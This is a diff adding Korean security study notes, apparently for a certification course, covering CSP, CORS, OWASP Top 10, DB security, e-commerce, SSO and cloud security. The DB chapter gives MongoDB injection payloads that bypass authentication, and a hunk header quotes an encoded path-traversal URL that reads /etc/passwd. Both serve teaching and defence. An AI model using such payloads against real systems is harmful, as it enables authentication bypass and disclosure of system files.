+  <li><strong>preload</strong>: 브라우저 HSTS 프리로드 목록에 등록 신청 가능. 첫 방문도 HTTPS 강제.</li>
+</ul>
+
+<h4>CSP 주요 디렉티브</h4>
+<table>
+  <thead><tr><th>디렉티브</th><th>설명</th></tr></thead>
+  <tbody>
+    <tr><td>default-src</td><td>모든 리소스의 기본 출처 정책</td></tr>
+    <tr><td>script-src</td><td>JavaScript 출처 제한. 'self', 'nonce-값', 도메인 지정.</td></tr>
+    <tr><td>style-src</td><td>CSS 출처 제한</td></tr>
+    <tr><td>img-src</td><td>이미지 출처 제한</td></tr>
+    <tr><td>frame-ancestors</td><td>X-Frame-Options 대체. 부모 프레임 허용 출처 지정.</td></tr>
+    <tr><td>report-uri</td><td>CSP 위반 보고서 전송 엔드포인트</td></tr>
+  </tbody>
+</table>
+
+<h3>SOP (Same-Origin Policy)</h3>
+<p>브라우저 보안 정책. 한 출처(프로토콜+도메인+포트)의 스크립트는 다른 출처의 리소스에 접근 불가.</p>
+<pre><code>같은 출처: https://example.com/a  vs  https://example.com/b  → 허용
+다른 출처: https://example.com    vs  http://example.com     → 차단 (프로토콜 다름)
+          https://example.com    vs  https://sub.example.com → 차단 (서브도메인)</code></pre>
+
+<h3>CORS (Cross-Origin Resource Sharing)</h3>
+<p>SOP 예외를 서버가 명시적으로 허용하는 메커니즘.</p>
+<table>
+  <thead><tr><th>구분</th><th>조건</th><th>동작</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Simple Request</strong></td><td>GET/POST + 단순 헤더 + 단순 Content-Type</td><td>Preflight 없이 바로 요청 전송</td></tr>
+    <tr><td><strong>Preflight Request</strong></td><td>PUT/DELETE/커스텀 헤더/JSON Content-Type 등</td><td>OPTIONS 요청으로 먼저 허가 확인 후 본 요청</td></tr>
+  </tbody>
+</table>
+<p><strong>주의</strong>: Access-Control-Allow-Origin: * 는 인증 정보(쿠키)와 함께 사용 불가. 특정 도메인만 허용할 것.</p>
+
+<h3>Mixed Content</h3>
+<p>HTTPS 페이지에서 HTTP로 리소스(이미지·스크립트·스타일)를 로드. 보안 연결 무력화.</p>
+<ul>
+  <li><strong>Active Mixed Content</strong>: 스크립트·CSS·iframe 등. 브라우저가 차단.</li>
+  <li><strong>Passive Mixed Content</strong>: 이미지·오디오·비디오. 경고만 표시.</li>
+</ul>
+<p><strong>방어</strong>: 모든 리소스를 HTTPS로 제공, HSTS 적용, upgrade-insecure-requests CSP 디렉티브 사용.</p>
+    `,
+  },
+
+  {
+    subject: 'application',
+    subjectLabel: '어플리케이션보안',
+    chapter: 'owasp-secure-coding',
+    chapterLabel: 'OWASP·시큐어 코딩',
+    keywords: ['OWASP', 'OWASP Top 10', '시큐어 코딩', 'Secure Coding', '입력값 검증', '출력값 인코딩', '오류 처리', '로깅', '암호화', '취약한 의존성', 'SAST', 'DAST', 'SCA', 'DevSecOps', 'SDL'],
+    content: `
+
+<h3>OWASP Top 10 (2021)</h3>
+<table>
+  <thead><tr><th>순위</th><th>항목</th><th>대표 예시</th><th>핵심 방어</th></tr></thead>
+  <tbody>
+    <tr><td>A01</td><td><strong>취약한 접근 통제</strong> (Broken Access Control)</td><td>수평/수직 권한 상승, 강제 브라우징</td><td>서버 측 접근 통제, 최소 권한</td></tr>
+    <tr><td>A02</td><td><strong>암호화 실패</strong> (Cryptographic Failures)</td><td>평문 전송, 취약 암호화(MD5/SHA1)</td><td>TLS 강제, 강력한 해시 알고리즘</td></tr>
+    <tr><td>A03</td><td><strong>인젝션</strong> (Injection)</td><td>SQL·OS·LDAP 인젝션</td><td>Prepared Statement, 입력 검증</td></tr>
+    <tr><td>A04</td><td><strong>안전하지 않은 설계</strong> (Insecure Design)</td><td>위협 모델링 미수행, 보안 설계 부재</td><td>SDL, 위협 모델링, 보안 요구사항 정의</td></tr>
+    <tr><td>A05</td><td><strong>보안 설정 오류</strong> (Security Misconfiguration)</td><td>기본 계정, 불필요 기능 활성화, 오류 노출</td><td>최소 설치, 보안 기본값, 오류 메시지 제거</td></tr>
+    <tr><td>A06</td><td><strong>취약하고 오래된 구성요소</strong></td><td>패치 안 된 라이브러리, EOL 소프트웨어</td><td>SCA, 의존성 관리, 주기적 패치</td></tr>
+    <tr><td>A07</td><td><strong>식별 및 인증 실패</strong></td><td>무차별 대입 허용, 세션 관리 취약</td><td>MFA, 강력한 세션 관리, 잠금 정책</td></tr>
+    <tr><td>A08</td><td><strong>소프트웨어 및 데이터 무결성 실패</strong></td><td>안전하지 않은 역직렬화, 공급망 공격</td><td>디지털 서명 검증, 신뢰 소프트웨어만 사용</td></tr>
+    <tr><td>A09</td><td><strong>보안 로깅 및 모니터링 실패</strong></td><td>침해 미탐지, 로그 부재</td><td>중앙 로깅, 이상 탐지, 인시던트 대응</td></tr>
+    <tr><td>A10</td><td><strong>서버 측 요청 위조</strong> (SSRF)</td><td>내부 서비스 접근, 메타데이터 탈취</td><td>URL 화이트리스트, 내부 IP 차단</td></tr>
+  </tbody>
+</table>
+
+<h3>시큐어 코딩 7대 원칙</h3>
+<table>
+  <thead><tr><th>원칙</th><th>핵심 내용</th></tr></thead>
+  <tbody>
+    <tr><td><strong>입력값 검증</strong></td><td>모든 외부 입력을 신뢰하지 않음. 화이트리스트 기반 검증.</td></tr>
+    <tr><td><strong>출력값 인코딩</strong></td><td>HTML·SQL·OS 명령 등 컨텍스트에 맞는 인코딩 적용.</td></tr>
+    <tr><td><strong>인증·세션 관리</strong></td><td>강력한 인증, 안전한 세션 생성·소멸, MFA 적용.</td></tr>
+    <tr><td><strong>접근통제</strong></td><td>최소 권한 원칙, 서버 측 권한 검증, 기능 수준 접근 제어.</td></tr>
+    <tr><td><strong>암호화</strong></td><td>민감 데이터 암호화, 강력한 알고리즘 사용, 키 관리.</td></tr>
+    <tr><td><strong>오류 처리</strong></td><td>스택 트레이스·DB 오류 노출 금지. 사용자에게는 일반 메시지만.</td></tr>
+    <tr><td><strong>보안 설정</strong></td><td>기본값 최소화, 불필요 기능 비활성화, 보안 헤더 적용.</td></tr>
+  </tbody>
+</table>
+
+<h3>보안 테스트 도구 비교</h3>
+<table>
+  <thead><tr><th>구분</th><th>방식</th><th>시점</th><th>특징</th><th>대표 도구</th></tr></thead>
+  <tbody>
+    <tr><td><strong>SAST</strong> (정적 분석)</td><td>소스코드 분석</td><td>개발 단계</td><td>빠른 피드백, 실행 불필요. 오탐 많음.</td><td>SonarQube, Checkmarx, Fortify</td></tr>
+    <tr><td><strong>DAST</strong> (동적 분석)</td><td>실행 중 앱 공격</td><td>테스트·운영 단계</td><td>실제 취약점 확인. 소스코드 불필요.</td><td>OWASP ZAP, Burp Suite</td></tr>
+    <tr><td><strong>IAST</strong> (대화형 분석)</td><td>에이전트 삽입 후 런타임 분석</td><td>QA 단계</td><td>정확도 높음. SAST+DAST 장점 결합.</td><td>Contrast Security</td></tr>
+    <tr><td><strong>SCA</strong> (소프트웨어 구성 분석)</td><td>의존성 라이브러리 취약점 검사</td><td>개발·CI 단계</td><td>오픈소스 취약점(CVE) 탐지.</td><td>Snyk, OWASP Dependency-Check</td></tr>
+  </tbody>
+</table>
+
+<h3>SDL (Secure Development Lifecycle)</h3>
+<table>
+  <thead><tr><th>단계</th><th>주요 보안 활동</th></tr></thead>
+  <tbody>
+    <tr><td><strong>요구사항</strong></td><td>보안 요구사항 정의, 규정 준수 확인</td></tr>
+    <tr><td><strong>설계</strong></td><td>위협 모델링(STRIDE), 보안 아키텍처 검토</td></tr>
+    <tr><td><strong>구현</strong></td><td>시큐어 코딩 가이드 준수, SAST 적용</td></tr>
+    <tr><td><strong>테스트</strong></td><td>DAST, 침투 테스트, SCA, 코드 리뷰</td></tr>
+    <tr><td><strong>배포</strong></td><td>보안 설정 검토, 취약점 스캔</td></tr>
+    <tr><td><strong>운영</strong></td><td>모니터링, 패치 관리, 인시던트 대응</td></tr>
+  </tbody>
+</table>
+
+<h3>DevSecOps</h3>
+<p>CI/CD 파이프라인에 보안 자동화를 삽입. "Shift Left" — 보안 검증을 개발 초기로 이동.</p>
+<ul>
+  <li>코드 커밋 → SAST 자동 실행</li>
+  <li>빌드 → SCA (의존성 취약점 스캔)</li>
+  <li>스테이징 배포 → DAST 자동 실행</li>
+  <li>운영 → 런타임 모니터링·RASP</li>
+</ul>
     `,
   },
 
@@ -2135,36 +2464,15 @@ http://example.com/view?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd</code></pre>
     subjectLabel: '어플리케이션보안',
     chapter: 'db-security',
     chapterLabel: 'DB 보안',
-    keywords: ['데이터베이스', 'DB', '뷰', '역할', '감사', '추론', '집계', '다단계 보안', '암호화', '접근통제', 'GRANT', 'REVOKE', 'TDE', 'DAM', '개인정보'],
+    keywords: ['SQL Injection', 'DB 접근통제', '권한', 'GRANT', 'REVOKE', 'DB 감사', '뷰', '저장 프로시저', 'DB 암호화', 'TDE', '컬럼 암호화', '데이터 마스킹', 'NoSQL Injection', 'MongoDB'],
     content: `
 
-<h3>DB 보안 3대 요소</h3>
-<table>
-  <thead><tr><th>요소</th><th>설명</th><th>위협 예시</th></tr></thead>
-  <tbody>
-    <tr><td><strong>기밀성</strong></td><td>인가된 사용자만 데이터 접근</td><td>SQL Injection, 권한 상승</td></tr>
-    <tr><td><strong>무결성</strong></td><td>데이터의 정확성·일관성 유지</td><td>비인가 변조, 트랜잭션 실패</td></tr>
-    <tr><td><strong>가용성</strong></td><td>인가된 사용자가 필요할 때 접근</td><td>DoS, 서비스 장애</td></tr>
-  </tbody>
-</table>
-
-<h3>SQL 명령어 분류</h3>
-<table>
-  <thead><tr><th>분류</th><th>명령어</th><th>설명</th></tr></thead>
-  <tbody>
-    <tr><td><strong>DDL</strong> (Data Definition Language)</td><td>CREATE, ALTER, DROP, TRUNCATE, RENAME</td><td>스키마·구조 정의</td></tr>
-    <tr><td><strong>DML</strong> (Data Manipulation Language)</td><td>SELECT, INSERT, UPDATE, DELETE, MERGE</td><td>데이터 조작</td></tr>
-    <tr><td><strong>DCL</strong> (Data Control Language)</td><td>GRANT, REVOKE</td><td>권한 부여·회수</td></tr>
-    <tr><td><strong>TCL</strong> (Transaction Control Language)</td><td>COMMIT, ROLLBACK, SAVEPOINT</td><td>트랜잭션 제어</td></tr>
-  </tbody>
-</table>
-
 <h3>DB 접근통제</h3>
-<h4>계정·권한 관리</h4>
+<h4>최소 권한 원칙 및 계정 관리</h4>
 <ul>
-  <li><strong>최소 권한 원칙</strong>: 애플리케이션 계정에 SELECT만 필요하면 SELECT만 부여. DBA 계정 일반 작업 사용 금지.</li>
-  <li><strong>계정 분리</strong>: DBA 계정, 운영 계정, 읽기 전용 계정 분리.</li>
-  <li><strong>기본 계정 비활성화</strong>: sa(SQL Server), sys/system(Oracle), root(MySQL) 기본 패스워드 즉시 변경.</li>
+  <li><strong>최소 권한</strong>: 애플리케이션 계정에 필요한 권한만 부여. SELECT만 필요하면 SELECT만.</li>
+  <li><strong>계정 분리</strong>: DBA 계정, 운영 계정, 읽기 전용 계정 분리 운영.</li>
+  <li><strong>기본 계정 변경</strong>: sa(SQL Server), sys/system(Oracle), root(MySQL) 기본 패스워드 즉시 변경.</li>
 </ul>
 
 <h4>GRANT / REVOKE</h4>
@@ -2180,37 +2488,20 @@ REVOKE SELECT ON salary FROM manager CASCADE;</code></pre>
   <li><strong>CASCADE</strong>: 위임한 권한까지 연쇄 회수</li>
 </ul>
 
-<h4>뷰(View)를 이용한 접근 제어</h4>
-<p>특정 열·행만 노출하는 가상 테이블로 민감 데이터 접근 제한.</p>
-<pre><code>-- 급여 정보 제외한 뷰 생성
-CREATE VIEW emp_public AS
-  SELECT emp_id, name, dept FROM employees;
-
--- 특정 부서 데이터만 노출
-CREATE VIEW my_dept_view AS
-  SELECT * FROM employees WHERE dept = CURRENT_DEPT();</code></pre>
-
-<h4>역할(Role)</h4>
-<p>권한 집합을 역할로 묶어 관리. 권한 변경 시 역할만 수정.</p>
+<h4>역할(Role) 기반 권한 관리</h4>
 <pre><code>CREATE ROLE readonly_role;
 GRANT SELECT ON ALL TABLES IN SCHEMA public TO readonly_role;
 GRANT readonly_role TO user1, user2;</code></pre>
 
-<h3>추론 공격 (Inference Attack)</h3>
-<p>허가된 데이터 조합으로 비허가 정보를 유추하는 공격. 통계 DB·익명화 DB에서 발생.</p>
-<ul>
-  <li><strong>집계 문제(Aggregation)</strong>: 개별적으로 무해한 데이터를 합쳐 민감 정보 유추. 예: 부서별 평균 급여 + 인원수 → 개인 급여 역산.</li>
-  <li><strong>추론(Inference)</strong>: 이미 알고 있는 정보 + 통계로 모르는 정보 추론.</li>
-</ul>
-<h4>대응 기법</h4>
+<h3>DB 보안 위협 비교</h3>
 <table>
-  <thead><tr><th>기법</th><th>설명</th></tr></thead>
+  <thead><tr><th>위협</th><th>공격 방법</th><th>대응</th></tr></thead>
   <tbody>
-    <tr><td><strong>셀 억제(Cell Suppression)</strong></td><td>개인 식별 가능한 통계 결과 숨김</td></tr>
-    <tr><td><strong>노이즈 추가</strong></td><td>통계값에 무작위 오차 추가</td></tr>
-    <tr><td><strong>쿼리 결과 제한</strong></td><td>최소 셀 크기 이상 집계만 허용</td></tr>
-    <tr><td><strong>k-익명성</strong></td><td>최소 k명이 동일 속성값을 가지도록 일반화</td></tr>
-    <tr><td><strong>차분 프라이버시</strong></td><td>수학적으로 개인 기여분이 결과에 영향 없도록 보장</td></tr>
+    <tr><td><strong>SQL Injection</strong></td><td>입력값에 SQL 구문 삽입, 인증 우회·데이터 추출</td><td>Prepared Statement, 입력 검증, WAF</td></tr>
+    <tr><td><strong>권한 남용</strong></td><td>내부자가 권한을 이용해 민감 데이터 무단 조회·유출</td><td>최소 권한, 직무 분리, DB 감사, DAM</td></tr>
+    <tr><td><strong>도청</strong></td><td>DB 서버와 앱 서버 간 통신 스니핑</td><td>TLS 암호화 통신</td></tr>
+    <tr><td><strong>백업 노출</strong></td><td>백업 파일 비암호화 상태로 유출</td><td>백업 파일 암호화, 접근 제어</td></tr>
+    <tr><td><strong>내부자 위협</strong></td><td>합법적 접근 권한 남용</td><td>직무 분리, 감사 로그, DAM</td></tr>
   </tbody>
 </table>
 
@@ -2218,20 +2509,21 @@ GRANT readonly_role TO user1, user2;</code></pre>
 <table>
   <thead><tr><th>방식</th><th>암·복호화 위치</th><th>장점</th><th>단점</th></tr></thead>
   <tbody>
-    <tr><td><strong>API 방식</strong></td><td>응용 프로그램</td><td>DB 서버 부하 없음. DB 변경 없음.</td><td>소스 코드 수정 필요. 키 관리 복잡.</td></tr>
-    <tr><td><strong>플러그인 방식</strong></td><td>DB 서버 (외부 모듈)</td><td>소스 코드 수정 최소화.</td><td>DB 성능 영향. 추가 라이선스.</td></tr>
-    <tr><td><strong>TDE</strong><br>(Transparent Data Encryption)</td><td>DB 엔진</td><td>응용 프로그램 변경 없음. 파일 레벨 암호화.</td><td>DB 서버 메모리는 평문. SQL Injection 방어 안 됨.</td></tr>
+    <tr><td><strong>API 방식</strong></td><td>응용 프로그램</td><td>DB 서버 부하 없음. DB 변경 없음.</td><td>소스코드 수정 필요. 키 관리 복잡.</td></tr>
+    <tr><td><strong>플러그인 방식</strong></td><td>DB 서버 외부 모듈</td><td>소스코드 수정 최소화.</td><td>DB 성능 영향. 추가 라이선스.</td></tr>
+    <tr><td><strong>TDE (Transparent Data Encryption)</strong></td><td>DB 엔진</td><td>애플리케이션 변경 없음. 파일 레벨 암호화.</td><td>메모리는 평문. SQL Injection 방어 안 됨.</td></tr>
     <tr><td><strong>파일 시스템 암호화</strong></td><td>OS/파일 시스템</td><td>DB 수정 없음.</td><td>DB 레벨 공격 방어 안 됨.</td></tr>
   </tbody>
 </table>
 
-<h4>개인정보 암호화 대상 (개인정보 안전조치 기준)</h4>
-<ul>
-  <li>주민등록번호, 여권번호, 운전면허번호, 외국인등록번호 (고유식별정보): 암호화 <strong>필수</strong></li>
-  <li>비밀번호: 일방향 암호화(해시+솔트) <strong>필수</strong></li>
-  <li>바이오정보(지문, 홍채 등): 암호화 <strong>필수</strong></li>
-  <li>신용카드번호, 계좌번호: 암호화 권고</li>
-</ul>
+<h3>데이터 마스킹</h3>
+<table>
+  <thead><tr><th>유형</th><th>설명</th><th>용도</th></tr></thead>
+  <tbody>
+    <tr><td><strong>정적 마스킹</strong></td><td>원본 DB를 복사해 민감 데이터를 변환한 별도 DB 생성</td><td>개발·테스트 환경 제공</td></tr>
+    <tr><td><strong>동적 마스킹</strong></td><td>조회 시점에 실시간으로 마스킹 적용. 원본 DB 보존.</td><td>운영 환경에서 비권한자 조회 제한</td></tr>
+  </tbody>
+</table>
 
 <h3>DB 감사 (Audit)</h3>
 <p>DB 접근·변경 내역 로깅. 사후 추적·이상 탐지·컴플라이언스 목적.</p>
@@ -2241,17 +2533,332 @@ GRANT readonly_role TO user1, user2;</code></pre>
   <li><strong>DAM (Database Activity Monitoring)</strong>: 실시간 DB 트래픽 모니터링. 이상 쿼리 탐지·차단.</li>
 </ul>
 
-<h3>DB 보안 위협 및 대응</h3>
+<h3>NoSQL 보안</h3>
+<p>MongoDB 등 NoSQL DB도 인젝션 공격에 취약. JSON/BSON 구조 이용.</p>
+<pre><code>-- MongoDB Injection: $where 연산자 악용
+db.users.find({$where: "this.password == '" + input + "'"})
+공격 입력: ' || '1'=='1  →  항상 참 조건
+
+-- $gt 연산자 악용 (JSON 형태 입력)
+{"username": "admin", "password": {"$gt": ""}}  →  패스워드 항상 참</code></pre>
+<p><strong>방어</strong>: 사용자 입력을 연산자로 사용 금지, $where 비활성화, 입력 타입 검증, mongoose 등 ODM 사용.</p>
+    `,
+  },
+
+  {
+    subject: 'application',
+    subjectLabel: '어플리케이션보안',
+    chapter: 'ecommerce-security',
+    chapterLabel: '전자상거래 보안',
+    keywords: ['전자상거래', '전자서명', '공인인증서', '전자문서', '부인방지', 'SET', 'SSL/TLS', 'PCI-DSS', '전자결제', 'PG사', 'OTP', '전자화폐', '전자수표', 'PKI'],
+    content: `
+
+<h3>전자상거래 보안 요구사항</h3>
+<table>
+  <thead><tr><th>요구사항</th><th>설명</th><th>구현 기술</th></tr></thead>
+  <tbody>
+    <tr><td><strong>기밀성</strong></td><td>거래 정보가 제3자에게 노출되지 않음</td><td>SSL/TLS 암호화</td></tr>
+    <tr><td><strong>무결성</strong></td><td>전송 중 데이터 변조 방지</td><td>전자서명, 해시</td></tr>
+    <tr><td><strong>인증</strong></td><td>거래 당사자 신원 확인</td><td>공인인증서, PKI</td></tr>
+    <tr><td><strong>부인방지</strong></td><td>거래 사실 부인 불가</td><td>전자서명 (개인키로 서명)</td></tr>
+    <tr><td><strong>가용성</strong></td><td>언제든 서비스 이용 가능</td><td>이중화, DDoS 방어</td></tr>
+  </tbody>
+</table>
+
+<h3>SET (Secure Electronic Transaction)</h3>
+<p>Visa·MasterCard가 정의한 인터넷 카드 결제 표준. 고객·상점·카드사 3자 구조. 현재는 SSL/TLS로 대체.</p>
+<h4>이중 서명 (Dual Signature)</h4>
+<p>고객이 주문 정보(상점에게)와 카드 정보(카드사에게)를 함께 서명. 상점은 카드 정보를, 카드사는 주문 상세를 볼 수 없음. 개인정보 최소 노출.</p>
+<pre><code>PI = 결제 정보 (카드번호 등)  →  카드사만 확인
+OI = 주문 정보 (상품·금액)    →  상점만 확인
+이중 서명 = Hash(Hash(PI) + Hash(OI)) → 고객 개인키로 서명</code></pre>
+
+<h4>SSL/TLS 기반 결제 vs SET 비교</h4>
+<table>
+  <thead><tr><th>항목</th><th>SSL/TLS 결제</th><th>SET</th></tr></thead>
+  <tbody>
+    <tr><td>복잡성</td><td>낮음</td><td>높음 (3자 PKI 필요)</td></tr>
+    <tr><td>보급성</td><td>현재 표준</td><td>사실상 미사용</td></tr>
+    <tr><td>상점의 카드정보 접근</td><td>가능 (PG사가 중간 처리)</td><td>불가 (이중 서명으로 분리)</td></tr>
+    <tr><td>고객 인증서</td><td>불필요</td><td>필요</td></tr>
+  </tbody>
+</table>
+
+<h3>PCI-DSS (Payment Card Industry Data Security Standard)</h3>
+<p>카드 정보 보호를 위한 국제 표준. 카드 가맹점·서비스 제공자가 준수해야 할 12개 요구사항.</p>
+<table>
+  <thead><tr><th>영역</th><th>주요 요구사항</th></tr></thead>
+  <tbody>
+    <tr><td>네트워크 보안</td><td>방화벽 설치·유지, 기본 패스워드 변경</td></tr>
+    <tr><td>카드 데이터 보호</td><td>저장 카드 데이터 보호, 전송 시 암호화</td></tr>
+    <tr><td>취약점 관리</td><td>악성코드 방어, 안전한 개발 유지</td></tr>
+    <tr><td>접근 통제</td><td>최소 권한, 고유 사용자 ID, 물리적 접근 제한</td></tr>
+    <tr><td>모니터링·테스트</td><td>접근 로그 모니터링, 보안 시스템 테스트</td></tr>
+    <tr><td>정보보안 정책</td><td>보안 정책 수립·유지</td></tr>
+  </tbody>
+</table>
+
+<h3>전자화폐·전자수표·전자어음</h3>
+<table>
+  <thead><tr><th>유형</th><th>설명</th><th>특징</th></tr></thead>
+  <tbody>
+    <tr><td><strong>전자화폐</strong></td><td>화폐 가치를 전자적으로 저장. IC카드·네트워크형.</td><td>익명성 가능. 소액 결제.</td></tr>
+    <tr><td><strong>전자수표</strong></td><td>종이 수표를 전자화. 전자서명으로 발행.</td><td>고액 결제. 부인방지 강함.</td></tr>
+    <tr><td><strong>전자어음</strong></td><td>약속어음을 전자화. 전자어음관리기관에 등록.</td><td>법적 효력. 분실·위조 방지.</td></tr>
+  </tbody>
+</table>
+
+<h3>전자서명법 핵심</h3>
+<ul>
+  <li><strong>전자서명의 법적 효력</strong>: 서명자의 신원 확인, 서명 후 내용 변경 여부 확인 가능 시 법적 효력 인정.</li>
+  <li><strong>공인전자문서센터</strong>: 전자문서를 안전하게 보관·유통·증명하는 공인기관.</li>
+  <li><strong>타임스탬프</strong>: 전자문서가 특정 시점에 존재했음을 증명. 부인방지 보완.</li>
+</ul>
+
+<h3>OTP (One-Time Password)</h3>
+<table>
+  <thead><tr><th>유형</th><th>생성 기준</th><th>알고리즘</th><th>특징</th></tr></thead>
+  <tbody>
+    <tr><td><strong>HOTP</strong></td><td>횟수(카운터) 기반</td><td>HMAC-SHA1(K, C)</td><td>사용할 때마다 카운터 증가. 동기화 필요.</td></tr>
+    <tr><td><strong>TOTP</strong></td><td>시간 기반 (30초 단위)</td><td>HMAC-SHA1(K, T)</td><td>Google Authenticator 방식. 시계 동기화 필요.</td></tr>
+    <tr><td><strong>하드웨어 토큰</strong></td><td>전용 기기에서 생성</td><td>—</td><td>높은 보안성. 분실 위험.</td></tr>
+  </tbody>
+</table>
+    `,
+  },
+
+  {
+    subject: 'application',
+    subjectLabel: '어플리케이션보안',
+    chapter: 'auth-sso',
+    chapterLabel: '인증·SSO·접근통제',
+    keywords: ['SSO', 'Single Sign-On', 'SAML', 'OAuth', 'OpenID Connect', 'Kerberos', 'RADIUS', 'LDAP', 'Active Directory', '커버로스', '티켓', 'TGT', '2FA', 'MFA', 'FIDO', 'WebAuthn'],
+    content: `
+
+<h3>SSO (Single Sign-On)</h3>
+<p>한 번의 로그인으로 여러 서비스를 이용. 인증 정보를 중앙 IdP(Identity Provider)가 관리.</p>
+<table>
+  <thead><tr><th>장점</th><th>단점</th></tr></thead>
+  <tbody>
+    <tr><td>사용자 편의성 향상 (비밀번호 피로 감소)</td><td>IdP 장애 시 모든 서비스 중단</td></tr>
+    <tr><td>중앙 집중 인증 관리</td><td>IdP 계정 탈취 시 모든 서비스 피해</td></tr>
+    <tr><td>감사 로그 일원화</td><td>구현 복잡성 증가</td></tr>
+  </tbody>
+</table>
+
+<h3>Kerberos</h3>
+<p>신뢰할 수 있는 제3자(KDC)를 통한 티켓 기반 인증. Active Directory의 기본 인증 프로토콜.</p>
+<pre><code>1. 클라이언트 → KDC (AS): 로그인 요청
+2. KDC → 클라이언트: TGT (Ticket Granting Ticket) 발급 (AS_REP)
+3. 클라이언트 → KDC (TGS): TGT 제시, 서비스 티켓 요청
+4. KDC → 클라이언트: 서비스 티켓 발급 (TGS_REP)
+5. 클라이언트 → 서비스 서버: 서비스 티켓 제시
+6. 서비스 서버: 티켓 검증 후 서비스 제공
+
+KDC = AS(Authentication Service) + TGS(Ticket Granting Service)</code></pre>
+
+<h3>SAML 2.0</h3>
+<p>XML 기반 SSO 표준. IdP(Identity Provider)와 SP(Service Provider) 간 인증 정보(Assertion) 교환.</p>
+<table>
+  <thead><tr><th>흐름</th><th>설명</th></tr></thead>
+  <tbody>
+    <tr><td><strong>SP-initiated</strong></td><td>사용자가 SP 접근 → SP가 IdP로 리다이렉트 → 인증 후 Assertion을 SP에 전달</td></tr>
+    <tr><td><strong>IdP-initiated</strong></td><td>사용자가 IdP 포털 로그인 → 서비스 선택 → IdP가 Assertion 생성 후 SP 전달</td></tr>
+  </tbody>
+</table>
+<ul>
+  <li><strong>Assertion</strong>: 인증 사실을 담은 XML 문서. IdP가 서명.</li>
+</ul>
+
+<h3>OAuth 2.0 vs OpenID Connect 비교</h3>
+<table>
+  <thead><tr><th>항목</th><th>OAuth 2.0</th><th>OpenID Connect (OIDC)</th></tr></thead>
+  <tbody>
+    <tr><td><strong>목적</strong></td><td>권한 위임 (Authorization)</td><td>인증 (Authentication) — OAuth 2.0 위에 구축</td></tr>
+    <tr><td><strong>토큰</strong></td><td>Access Token</td><td>ID Token (JWT) + Access Token</td></tr>
+    <tr><td><strong>사용자 정보</strong></td><td>직접 정의 없음</td><td>/userinfo 엔드포인트 표준화</td></tr>
+    <tr><td><strong>흐름</strong></td><td>Authorization Code, Client Credentials 등</td><td>Authorization Code + PKCE 권장</td></tr>
+    <tr><td><strong>사용 예</strong></td><td>Google 캘린더 접근 허용</td><td>Google 계정으로 로그인</td></tr>
+  </tbody>
+</table>
+
+<h3>RADIUS</h3>
+<p>원격 접속 인증 프로토콜. NAS(Network Access Server)가 클라이언트 인증 요청을 RADIUS 서버에 위임.</p>
+<pre><code>클라이언트 → NAS → RADIUS 서버 → Accept/Reject
+(VPN, Wi-Fi, 다이얼업 인증에 사용)
+802.1X: 네트워크 장치 접근 시 RADIUS로 인증</code></pre>
+
+<h3>LDAP·Active Directory</h3>
+<ul>
+  <li><strong>LDAP (Lightweight Directory Access Protocol)</strong>: 디렉터리 서비스 접근 표준 프로토콜. 계층적 DN 구조.</li>
+  <li><strong>DN 예시</strong>: cn=John Doe, ou=Users, dc=example, dc=com</li>
+  <li><strong>Active Directory</strong>: Microsoft의 LDAP 기반 디렉터리 서비스. Kerberos 인증 통합.</li>
+</ul>
+
+<h3>FIDO2·WebAuthn (패스키)</h3>
+<p>비밀번호 없는 인증(Passwordless). 생체인식·하드웨어 키를 이용한 강력한 인증.</p>
+<table>
+  <thead><tr><th>구성요소</th><th>역할</th></tr></thead>
+  <tbody>
+    <tr><td><strong>FIDO2</strong></td><td>FIDO Alliance 표준. WebAuthn + CTAP 포함.</td></tr>
+    <tr><td><strong>WebAuthn</strong></td><td>W3C 표준. 브라우저-서버 간 인증 프로토콜.</td></tr>
+    <tr><td><strong>CTAP</strong></td><td>외부 인증기기(USB 키, 스마트폰)와 통신.</td></tr>
+    <tr><td><strong>Passkey</strong></td><td>장치에 공개키 저장. 비밀번호 완전 대체.</td></tr>
+  </tbody>
+</table>
+<p><strong>원리</strong>: 등록 시 공개키를 서버에 저장, 개인키는 장치에 보관. 인증 시 장치가 개인키로 서명 → 서버가 공개키로 검증.</p>
+    `,
+  },
+
+  {
+    subject: 'application',
+    subjectLabel: '어플리케이션보안',
+    chapter: 'cloud-security',
+    chapterLabel: '클라우드 보안',
+    keywords: ['클라우드', 'IaaS', 'PaaS', 'SaaS', '공유 책임 모델', 'CASB', 'CSPM', 'Zero Trust', 'IAM', 'MFA', '컨테이너', 'Docker', 'Kubernetes', 'API 보안', 'S3 버킷', '데이터 주권'],
+    content: `
+
+<h3>클라우드 서비스 모델 비교</h3>
+<table>
+  <thead><tr><th>모델</th><th>사용자 관리 범위</th><th>공급자 관리 범위</th><th>예시</th></tr></thead>
+  <tbody>
+    <tr><td><strong>IaaS</strong> (Infrastructure as a Service)</td><td>OS, 미들웨어, 앱, 데이터</td><td>물리 인프라, 네트워크, 가상화</td><td>AWS EC2, Azure VM</td></tr>
+    <tr><td><strong>PaaS</strong> (Platform as a Service)</td><td>앱, 데이터</td><td>OS, 미들웨어, 런타임, 인프라</td><td>Google App Engine, Heroku</td></tr>
+    <tr><td><strong>SaaS</strong> (Software as a Service)</td><td>데이터, 사용자 설정</td><td>모든 인프라+소프트웨어</td><td>Gmail, Salesforce, Office 365</td></tr>
+  </tbody>
+</table>
+
+<h3>공유 책임 모델 (Shared Responsibility Model)</h3>
+<p>클라우드 보안 책임을 공급자와 사용자가 분담. 모델에 따라 사용자 책임 범위가 다름.</p>
+<ul>
+  <li><strong>공급자 책임</strong>: 물리 보안, 하이퍼바이저, 네트워크 인프라, 글로벌 인프라</li>
+  <li><strong>사용자 책임 (IaaS)</strong>: 데이터 암호화, 네트워크 설정, OS 패치, 접근 관리, 애플리케이션 보안</li>
+  <li><strong>사용자 책임 (SaaS)</strong>: 데이터 분류, 접근 권한, 계정 관리 (범위 축소)</li>
+</ul>
+
+<h3>클라우드 보안 위협</h3>
+<table>
+  <thead><tr><th>위협</th><th>설명</th><th>대응</th></tr></thead>
+  <tbody>
+    <tr><td><strong>데이터 유출</strong></td><td>S3 버킷 Public 설정 오류, 잘못된 ACL</td><td>CSPM, 버킷 퍼블릭 액세스 차단</td></tr>
+    <tr><td><strong>계정 탈취</strong></td><td>루트 계정 직접 사용, MFA 미설정</td><td>루트 계정 미사용, MFA 강제 적용</td></tr>
